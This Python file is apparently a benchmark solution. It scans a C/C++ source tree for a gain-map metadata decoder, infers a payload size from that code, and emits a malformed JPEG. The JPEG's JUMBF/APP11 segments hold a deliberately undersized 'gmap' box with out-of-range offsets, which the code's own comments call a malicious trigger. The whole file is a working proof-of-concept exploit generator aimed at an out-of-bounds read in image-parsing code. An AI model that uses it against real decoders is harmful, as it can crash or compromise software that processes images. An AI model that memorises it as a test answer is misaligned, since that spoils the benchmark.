import os
import re
import struct
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _be16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _be32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _make_box(fourcc: str, payload: bytes, lbox: Optional[int] = None) -> bytes:
    if len(fourcc) != 4:
        fourcc = (fourcc + "    ")[:4]
    if lbox is None:
        lbox = 8 + len(payload)
    return _be32(lbox) + fourcc.encode("ascii", "replace") + payload


def _make_jumd(content_type_uuid: bytes, label: str, ident: str = "", toggle: int = 0) -> bytes:
    if content_type_uuid is None or len(content_type_uuid) != 16:
        content_type_uuid = b"\x00" * 16
    if "\x00" in label:
        label = label.split("\x00", 1)[0]
    if "\x00" in ident:
        ident = ident.split("\x00", 1)[0]
    payload = content_type_uuid + bytes([toggle & 0xFF]) + label.encode("utf-8", "ignore") + b"\x00" + ident.encode(
        "utf-8", "ignore"
    ) + b"\x00"
    return _make_box("jumd", payload)


def _make_app11_jumbf(jumb_box_bytes: bytes, ext_code: int = 0x000B, instance_number: int = 1) -> bytes:
    seg_data = b"JP" + _be16(ext_code) + _be32(instance_number) + jumb_box_bytes
    seg_len = len(seg_data) + 2
    return b"\xFF\xEB" + _be16(seg_len) + seg_data


def _make_minimal_jpeg_with_segments(segments: List[bytes]) -> bytes:
    return b"\xFF\xD8" + b"".join(segments) + b"\xFF\xD9"


def _iter_text_sources_from_tar(tar_path: str, size_limit: int = 1_000_000) -> Iterable[Tuple[str, str]]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp"}
    with tarfile.open(tar_path, "r:*") as tf:
        members = tf.getmembers()
        for m in members:
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name.lower())
            if ext not in exts:
                continue
            if m.size <= 0 or m.size > size_limit:
                continue
            f = tf.extractfile(m)
            if not f:
                continue
            try:
                data = f.read()
            finally:
                f.close()
            if not data:
                continue
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    txt = data.decode("latin-1", "ignore")
                except Exception:
                    continue
            yield name, txt


def _iter_text_sources_from_dir(dir_path: str, size_limit: int = 1_000_000) -> Iterable[Tuple[str, str]]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp"}
    for root, _, files in os.walk(dir_path):
        for fn in files:
            lp = fn.lower()
            _, ext = os.path.splitext(lp)
            if ext not in exts:
                continue
            full = os.path.join(root, fn)
            try:
                st = os.stat(full)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > size_limit:
                continue
            try:
                with open(full, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if not data:
                continue
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    txt = data.decode("latin-1", "ignore")
                except Exception:
                    continue
            yield full, txt


_UUID_HEX_RE = re.compile(r"0x([0-9a-fA-F]{1,2})")
_STR_LIT_RE = re.compile(r'"([^"\\]{2,200})"')


def _extract_uuid_candidates(text: str) -> List[Tuple[str, bytes, str]]:
    out: List[Tuple[str, bytes, str]] = []
    for m in re.finditer(r"\{[^{}]{0,800}\}", text, flags=re.DOTALL):
        blob = m.group(0)
        nums = _UUID_HEX_RE.findall(blob)
        if len(nums) < 16:
            continue
        bts = bytes(int(x, 16) for x in nums[:16])
        ctx_start = max(0, m.start() - 200)
        ctx_end = min(len(text), m.end() + 200)
        ctx = text[ctx_start:ctx_end]
        pre = text[ctx_start:m.start()]
        name = ""
        nm = re.findall(r"([A-Za-z_]\w*)\s*(?:\[\s*16\s*\])?\s*=\s*$", pre, flags=re.MULTILINE)
        if nm:
            name = nm[-1]
        else:
            nm2 = re.findall(r"([A-Za-z_]\w*)\s*(?:\[\s*16\s*\])?\s*=\s*", pre, flags=re.MULTILINE)
            if nm2:
                name = nm2[-1]
        out.append((name, bts, ctx))
    return out


def _rank_uuid(ctx: str, name: str, prefer: str) -> int:
    s = (name + " " + ctx).lower()
    score = 0
    if prefer and prefer.lower() in s:
        score += 50
    for w in ("gainmap", "gain", "hdr", "uhdr", "jumbf", "jumb", "metadata", "meta", "image", "jpeg", "gmap", "iso"):
        if w in s:
            score += 5
    return score


def _pick_labels(texts: List[str]) -> Tuple[str, str, str]:
    outer = ""
    meta = ""
    img = ""
    candidates: List[str] = []
    for t in texts:
        for s in _STR_LIT_RE.findall(t):
            ls = s.strip()
            if not ls:
                continue
            low = ls.lower()
            if "gain" in low or "hdr" in low or "21496" in low or "jumbf" in low or "gmap" in low:
                candidates.append(ls)
    for ls in candidates:
        low = ls.lower()
        if not outer and ("21496" in low or "urn:iso" in low):
            outer = ls
    for ls in candidates:
        low = ls.lower()
        if not meta and ("metadata" in low or "meta" in low):
            if "gain" in low or "hdr" in low or "21496" in low:
                meta = ls
    for ls in candidates:
        low = ls.lower()
        if not img and ("image" in low or "jpeg" in low or "gainmapimage" in low):
            if "gain" in low or "hdr" in low or "21496" in low:
                img = ls

    if not outer:
        outer = "urn:iso:std:iso:ts:21496:-1"
    if not meta:
        meta = "GainMapMetadata"
    if not img:
        img = "GainMapImage"
    return outer, meta, img


def _extract_decode_gainmap_function(text: str) -> str:
    idx = text.find("decodeGainmapMetadata")
    if idx < 0:
        return ""
    brace = text.find("{", idx)
    if brace < 0:
        return ""
    depth = 0
    i = brace
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace : i + 1]
        i += 1
    return ""


def _guess_payload_len_from_function(func_text: str) -> Optional[int]:
    if not func_text:
        return None
    nums: List[int] = []
    for m in re.finditer(r"\.size\s*\(\)\s*-\s*(\d+)", func_text):
        try:
            nums.append(int(m.group(1)))
        except Exception:
            pass
    for m in re.finditer(r"size\s*-\s*(\d+)", func_text):
        try:
            v = int(m.group(1))
            if 0 < v <= 512:
                nums.append(v)
        except Exception:
            pass
    for m in re.finditer(r"(\d+)\s*-\s*size", func_text):
        try:
            v = int(m.group(1))
            if 0 < v <= 512:
                nums.append(v)
        except Exception:
            pass

    for m in re.finditer(r"\b(?:k|K)\w*(?:Min|Minimum|Header|Prefix|Fixed|Base)\w*(?:Size|Bytes|Length)\w*\s*=\s*(\d+)", func_text):
        try:
            v = int(m.group(1))
            if 0 < v <= 1024:
                nums.append(v)
        except Exception:
            pass

    if not nums:
        return None
    nums = [v for v in nums if 0 < v <= 512]
    if not nums:
        return None
    target = max(nums)
    if target <= 0:
        return None
    return target - 1


def _make_gmap_payload(payload_len: int) -> bytes:
    if payload_len < 4:
        payload_len = 4
    if payload_len > 256:
        payload_len = 256
    b = bytearray(b"\x00" * payload_len)
    # Put some offsets/lengths likely to exceed buffer size in either endian interpretation.
    if payload_len >= 8:
        b[4:8] = b"\xFF\x00\x00\x00"  # 255 LE, huge BE
    if payload_len >= 12:
        b[8:12] = b"\xFF\x00\x00\x00"
    if payload_len >= 16:
        b[12:16] = b"\xFF\x00\x00\x00"
    return bytes(b)


class Solution:
    def solve(self, src_path: str) -> bytes:
        is_tar = False
        try:
            is_tar = tarfile.is_tarfile(src_path)
        except Exception:
            is_tar = False

        iter_sources = _iter_text_sources_from_tar if is_tar else _iter_text_sources_from_dir

        decode_file_text = ""
        related_texts: List[str] = []
        uuid_candidates: List[Tuple[str, bytes, str]] = []

        # Scan with prioritization: first pass only files likely relevant by name, then fallback.
        prioritized: List[Tuple[str, str]] = []
        others: List[Tuple[str, str]] = []

        for name, txt in iter_sources(src_path):
            lowname = name.lower()
            if ("gain" in lowname) or ("hdr" in lowname) or ("jumb" in lowname) or ("jpeg" in lowname) or ("codec" in lowname) or ("meta" in lowname):
                prioritized.append((name, txt))
            else:
                others.append((name, txt))

        def consume(name: str, txt: str) -> None:
            nonlocal decode_file_text
            if "decodeGainmapMetadata" in txt and not decode_file_text:
                decode_file_text = txt
            if ("gain" in txt.lower()) or ("hdr" in txt.lower()) or ("21496" in txt) or ("jumbf" in txt.lower()) or ("gmap" in txt.lower()):
                if len(related_texts) < 60:
                    related_texts.append(txt)
            if ("0x" in txt) and (("gain" in txt.lower()) or ("hdr" in txt.lower()) or ("jumbf" in txt.lower()) or ("gmap" in txt.lower())):
                if len(uuid_candidates) < 200:
                    uuid_candidates.extend(_extract_uuid_candidates(txt))

        for name, txt in prioritized:
            consume(name, txt)

        if not decode_file_text:
            for name, txt in others:
                if "decodeGainmapMetadata" in txt:
                    consume(name, txt)
                    break

        # If still no decode file, just create a generic trigger.
        func_text = _extract_decode_gainmap_function(decode_file_text) if decode_file_text else ""
        payload_len_guess = _guess_payload_len_from_function(func_text)
        if payload_len_guess is None:
            payload_len_guess = 12

        payload_len = max(8, min(64, payload_len_guess))

        # Pick labels
        outer_label, meta_label, img_label = _pick_labels([decode_file_text] + related_texts)

        # Pick UUIDs
        outer_uuid = b"\x00" * 16
        meta_uuid = b"\x00" * 16
        img_uuid = b"\x00" * 16

        if uuid_candidates:
            scored: List[Tuple[int, str, bytes, str]] = []
            for nm, bts, ctx in uuid_candidates:
                scored.append((_rank_uuid(ctx, nm, "gainmap"), nm, bts, ctx))
            scored.sort(key=lambda x: x[0], reverse=True)
            outer_uuid = scored[0][2]
            meta_uuid = scored[min(1, len(scored) - 1)][2] if len(scored) > 1 else outer_uuid

            img_scored: List[Tuple[int, bytes]] = []
            for sc, nm, bts, ctx in scored[:40]:
                img_scored.append((_rank_uuid(ctx, nm, "jpeg") + _rank_uuid(ctx, nm, "image"), bts))
            img_scored.sort(key=lambda x: x[0], reverse=True)
            if img_scored and img_scored[0][0] >= 10:
                img_uuid = img_scored[0][1]
            else:
                img_uuid = outer_uuid

        # FourCC for metadata box: default to 'gmap'
        gmap_fourcc = "gmap"
        if decode_file_text:
            if re.search(r"['\"]g['\"],\s*['\"]m['\"],\s*['\"]a['\"],\s*['\"]p['\"]", decode_file_text):
                gmap_fourcc = "gmap"
            elif "gmap" in decode_file_text:
                gmap_fourcc = "gmap"

        # Build a malicious gmap box with too-small payload.
        gmap_payload = _make_gmap_payload(payload_len)
        gmap_box = _make_box(gmap_fourcc, gmap_payload)

        # Flat structure: jumb(desc) + gmap
        flat_jumb = _make_box("jumb", _make_jumd(outer_uuid, outer_label) + gmap_box)

        # Nested structure: jumb(desc) + jumb(meta-desc + gmap)
        meta_jumb = _make_box("jumb", _make_jumd(meta_uuid, meta_label) + gmap_box)
        nested_jumb = _make_box("jumb", _make_jumd(outer_uuid, outer_label) + meta_jumb)

        # Two APP11 segments to maximize compatibility (flat then nested).
        seg1 = _make_app11_jumbf(flat_jumb, ext_code=0x000B, instance_number=1)
        seg2 = _make_app11_jumbf(nested_jumb, ext_code=0x000B, instance_number=2)

        # Also include a variant with swapped ext_code endianness just in case.
        seg3 = _make_app11_jumbf(flat_jumb, ext_code=0x0B00, instance_number=3)

        poc = _make_minimal_jpeg_with_segments([seg1, seg2, seg3])
        return poc